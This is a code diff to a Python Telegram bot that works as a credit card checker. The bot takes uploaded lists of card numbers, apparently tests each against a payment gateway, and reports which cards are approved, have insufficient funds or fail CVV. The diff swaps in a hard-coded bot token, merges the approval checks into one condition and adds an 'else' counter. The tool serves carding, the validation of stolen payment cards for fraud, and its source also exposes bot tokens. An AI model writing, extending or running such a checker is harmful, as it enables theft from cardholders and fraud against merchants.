@@ -40,7 +40,7 @@ def  binn(bin,c,re):
 零 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>{country_name} {country_flag} {country_currencies}</code>
 
 ᥫ᭡ 𝙗𝙤𝙩 @M77SALAH"""
-token = ('6445619223:AAFI8Q3zIJzjvTCQkgZBTaINJJSIKHZOlIw')
+token = '7161511800:AAG8qP9cybURl6XdM8Kp2fylgQlsyBw7oF0'
 
 
 
@@ -53,7 +53,7 @@ def start(message):
     if message.from_user.id:
         idd = message.from_user.id
         first = message.from_user.first_name
-        bot.reply_to(message,f"Hello Pro Bot\nPlease Send Cc List",parse_mode="markdown")
+        bot.reply_to(message,f"Hello Pro Bot\nPlease Send Cc List ✓",parse_mode="markdown")
         
 
 
@@ -67,6 +67,7 @@ def send_file(message):
 	cvv=0
 	app=0
 	nc=0
+	els=0
 	try:
 		file_input = bot.download_file(bot.get_file(message.document.file_id).file_path)
 		with open(f"{message.document.file_name}", 'wb') as f:
@@ -250,92 +251,45 @@ def send_file(message):
 			msg = response.text
 			color="\033[1;31m"
 		if 'Card Issuer Declined CVV' in msg:
-			re="Declined CVV ❌"
-			msg="Declined CVV ❌"
+			re="Declined CVV ❎"
+			msg="Declined CVV ❎"
 			color='\033[1;32m'
 			ccn+=1
 			mjj=binn(cc,c,re)
-#			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
-			
-			
+			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
 		if 'Insufficient Funds' in msg:
-			re="Insufficient Funds. ❌"
-			msg="Insufficient Funds. ❌"
+			re="Insufficient Funds. ✅"
+			msg="Insufficient Funds. ✅"
 			color='\033[1;32m'
 			cvv+=1
 			mjj=binn(cc,c,re)
-			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html') 
+			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
+		if 'Payment method successfully added.' in msg or 'street address.' in msg or 'Gateway Rejected: avs' in msg or "Status code avs: Gateway Rejected: avs" in msg or "payment method added:" in msg or "Duplicate card exists in the vault." in msg or "Payment method successfully added." in msg or "woocommerce-message" in msg:
+			app+=1
+			msg="Approved ✅"
+			re="Approved. ✅"
+			color='\033[1;32m'
+			mjj=binn(cc,c,re)
+			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
+			
+		else:
+			els+=1
+			msg="else ✅"
+			re="else ✅"
+			color='\033[1;32m'
+			mjj=binn(cc,c,re)
+			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
 			
 		
-		if 'Payment method successfully added.' in msg:
-			re = 'Payment method successfully added'
-			msg="Payment method successfully added ✅"
-			app+=1
-			color='\033[1;32m'
-			mjj=binn(cc,c,re)
-			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
-			
-		if 'street address.' in msg:
-			re = 'street address.'
-			msg="street address. ✅"
-			app+=1
-			color='\033[1;32m'
-			mjj=binn(cc,c,re)
-			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
-			
-			
-		if 'Gateway Rejected: avs' in msg:
-			re = 'Gateway Rejected: avs'
-			msg="Gateway Rejected: avs ✅"
-			app+=1
-			color='\033[1;32m'
-			mjj=binn(cc,c,re)
-			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
-			
-			
-		if 'Status code avs: Gateway Rejected: avs' in msg:
-			re = 'Status code avs: Gateway Rejected: avs'
-			msg="Status code avs: Gateway Rejected: avs ✅"
-			app+=1
-			color='\033[1;32m'
-			mjj=binn(cc,c,re)
-			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
-			
-			
-		if 'payment method added:' in msg:
-			re = 'payment method added:'
-			msg="payment method added: ✅"
-			app+=1
-			color='\033[1;32m'
-			mjj=binn(cc,c,re)
-			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
-			
-			
-		if 'Duplicate card exists in the vault.' in msg:
-			re = 'Duplicate card exists in the vault.'
-			msg="Duplicate card exists in the vault. ✅"
-			app+=1
-			color='\033[1;32m'
-			mjj=binn(cc,c,re)
-			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
-			
-			
-		if 'woocommerce-message' in msg:
-			re = 'woocommerce-message'
-			msg="woocommerce-message ✅"
-			app+=1
-			color='\033[1;32m'
-			mjj=binn(cc,c,re)
-			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
-					
 		
 		key = types.InlineKeyboardMarkup(row_width=1)
 		ccli = types.InlineKeyboardButton(f" {g} ☢", callback_data="cclist")
-		ccnn = types.InlineKeyboardButton(f" ccn good : {ccn} ❌", callback_data="cvv")
-		cvvv = types.InlineKeyboardButton(f" cvv good : {cvv} ❌", callback_data="cvv")
+		ccnn = types.InlineKeyboardButton(f" ccn good : {ccn} ❎", callback_data="cvv")
+		cvvv = types.InlineKeyboardButton(f" cvv good : {cvv} ❎", callback_data="cvv")
 		ap = types.InlineKeyboardButton(f" approved : {app} ✅", callback_data="aproved")
 		badd = types.InlineKeyboardButton(f" stauts : {msg} ❕", callback_data="baad")
 		nch = types.InlineKeyboardButton(f" num chk : {nc} 💱", callback_data="chk")
+		ap = types.InlineKeyboardButton(f" else new : {els} ✅", callback_data="else ")
 		own = types.InlineKeyboardButton(f"OWNAR", url="https://t.me/ch4kscript")
 		key.add(ccli,badd,nch,ap,ccnn, cvvv,own )
 		bot.edit_message_text(chat_id=message.chat.id, message_id=idmss.message_id,text="Checker Run ✔", reply_markup=key)
